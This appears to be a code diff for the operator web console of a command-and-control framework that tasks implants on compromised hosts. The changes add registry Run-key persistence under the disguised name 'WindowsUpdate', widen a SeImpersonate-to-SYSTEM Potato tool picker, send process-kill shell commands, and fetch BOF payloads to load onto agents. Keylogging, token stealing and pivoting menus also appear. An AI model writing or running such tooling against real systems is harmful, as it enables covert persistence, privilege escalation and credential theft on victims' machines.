@@ -3055,11 +3055,10 @@ async function runCtxAction(act) {
       const aid = act.id || activeAgent?.id; if (!aid) break;
       showQuickForm('🥔 SeImpersonate → SYSTEM (Potato)', [
         {key:'tool', label:'Tool (must be uploaded)', type:'select', options:[
-          {v:'PrintSpoofer64.exe', l:'PrintSpoofer (print spool trigger)'},
           {v:'GodPotato-NET4.exe', l:'GodPotato (.NET 4 — Win10/2019+)'},
           {v:'GodPotato-NET2.exe', l:'GodPotato (.NET 2 — legacy)'},
-          {v:'MultiPotato.exe',    l:'MultiPotato (custom trigger)'},
-        ], def:'PrintSpoofer64.exe'},
+          {v:'SweetPotato.exe',    l:'SweetPotato (token impersonation)'},
+        ], def:'GodPotato-NET4.exe'},
         {key:'cmd', label:'Command to run as SYSTEM', ph:'cmd.exe', def:'cmd.exe'},
       ], vals => {
         if (!vals.tool) { toast('Tool required','red'); return; }
@@ -3198,6 +3197,25 @@ async function runCtxAction(act) {
       showPrompt('Persistence', 'Scheduled task name', 'WindowsDefenderHealthService', name => {
         api('POST', `/api/agents/${aid}/task`, {type:'PERSIST_TASK', args:name})
           .then(r => { if (r?.ok) toast(`PERSIST_TASK: ${name}`); });
+      });
+      break;
+    }
+    case 'persistRegKey': {
+      const aid = act.id || activeAgent?.id;
+      if (!aid) break;
+      showPrompt('Run Key Persistence', 'Registry value name (HKCU Run)', 'WindowsUpdate', name => {
+        const keyName = name.trim() || 'WindowsUpdate';
+        api('POST', `/api/agents/${aid}/task`, {type:'PERSIST', args: JSON.stringify({method:'registry', name:keyName})})
+          .then(r => { if (r?.ok) toast(`PERSIST registry: ${keyName}`); });
+      });
+      break;
+    }
+    case 'persistRemovePrompt': {
+      const aid = act.id || activeAgent?.id;
+      if (!aid) break;
+      showPrompt('Remove Persistence', 'Task / key name to remove (blank = default)', '', name => {
+        api('POST', `/api/agents/${aid}/task`, {type:'PERSIST_RM', args: name.trim()})
+          .then(r => { if (r?.ok) toast(`PERSIST_RM: ${name.trim()||'(default)'}`); });
       });
       break;
     }
@@ -3468,7 +3486,10 @@ function renderProcessTableJSON(wrap, procs) {
 
 async function psKill(pid) {
   if (!psAgentId || !confirm(`Kill PID ${pid}?`)) return;
-  const r = await api('POST', `/api/agents/${psAgentId}/task`, {type:'KILL', args:String(pid)});
+  const ag = agents.find(a => a.id === psAgentId);
+  const isWin = !ag?.os?.toLowerCase().includes('linux');
+  const killCmd = isWin ? `taskkill /F /PID ${pid}` : `kill -9 ${pid}`;
+  const r = await api('POST', `/api/agents/${psAgentId}/task`, {type:'SHELL', args:killCmd});
   if (r?.ok) { toast(`Kill signal sent to PID ${pid}`); setTimeout(refreshProcessList, 1500); }
 }
 async function psInject(pid, name) {
@@ -3769,10 +3790,10 @@ function agentContextMenu(e, agentId) {
       {label:'⌨️  Keylog Stop',              action:{fn:'selectAndTask', id, type:'KEYLOG_STOP',  args:''}},
     ]},
     {_sub:'🔒  Persistence', items:[
-      {label:'Run Key (HKCU)',       action:{fn:'selectAndTask', id, type:'PERSIST',    args:''}},
+      {label:'Run Key (HKCU)…',     action:{fn:'persistRegKey', id}},
       {label:'Scheduled Task…',     action:{fn:'persistTask', id}},
       null,
-      {label:'Remove Persistence',  action:{fn:'selectAndTask', id, type:'PERSIST_RM', args:''}, danger:true},
+      {label:'Remove Persistence…', action:{fn:'persistRemovePrompt', id}, danger:true},
     ]}] : []),
     {_sub:'🧦  Tunnel / Pivot', items:[
       {label:'SOCKS5 Start…',       action:{fn:'socks5Start', id}},
@@ -5985,8 +6006,11 @@ function agentStatus(a) {
 }
 
 function selectAgent(id, openConsole = true) {
-  activeAgent = agents.find(a => a.id === id);
-  if (openConsole) openConsoleFor(id);
+  if (openConsole) {
+    openConsoleFor(id); // switchConsoleTab sets activeAgent correctly
+  } else {
+    activeAgent = agents.find(a => a.id === id);
+  }
   document.querySelectorAll('#agents-tbody tr').forEach(tr => tr.classList.remove('selected'));
   event?.currentTarget?.classList.add('selected');
 }
@@ -8774,7 +8798,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       if (!args) { addConsoleOutput('usage: make-token domain\\\\user password', '', null); return; }
       const sp = args.indexOf(' ');
       if (sp < 0) { addConsoleOutput('usage: make-token domain\\\\user password', '', null); return; }
-      taskType='MAKE_TOKEN'; taskArgs=args; break;
+      taskType='TOKEN_MAKE'; taskArgs=args; break;
     }
     case 'steal-token': taskType='STEAL_TOKEN'; taskArgs=args; break;
     case 'portfwd': {
@@ -8804,7 +8828,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       if (parts2[0] === 'task') {
         taskType='PERSIST_TASK'; taskArgs=parts2.slice(1).join(' ')||'';
       } else if (parts2[0] === 'rm' || parts2[0] === 'remove') {
-        taskType='PERSIST_RM'; taskArgs='';
+        taskType='PERSIST_RM'; taskArgs=parts2.slice(1).join(' ');
       } else {
         taskType='PERSIST';
         taskArgs = JSON.stringify({method:parts2[0], cmd:parts2.slice(1).join(' ')});
@@ -9266,7 +9290,16 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       const [bs,...br] = args.split(' ');
       if (bs==='list') { taskType='BOF_STORE_LIST'; }
       else if (bs==='unload') { taskType='BOF_STORE_UNLOAD'; taskArgs=br[0]||''; }
-      else if (bs==='load') { taskType='BOF_STORE_LOAD'; taskArgs=br[0]||''; }
+      else if (bs==='load') {
+        const bofName = br[0]||''; const bofFile = br[1]||br[0]||'';
+        if (!bofName || !bofFile) { addConsoleOutput('usage: bof-store load <name> <file.coff>', '', null); return; }
+        addConsoleOutput(`[*] Fetching ${bofFile}…`, '', null);
+        try {
+          const bofBytes = await fetchSCFile(bofFile);
+          payload = u8ToB64(bofBytes);
+          taskType = 'BOF_STORE_LOAD'; taskArgs = bofName;
+        } catch(e) { addConsoleOutput('', e.message, null); return; }
+      }
       break;
     }
 
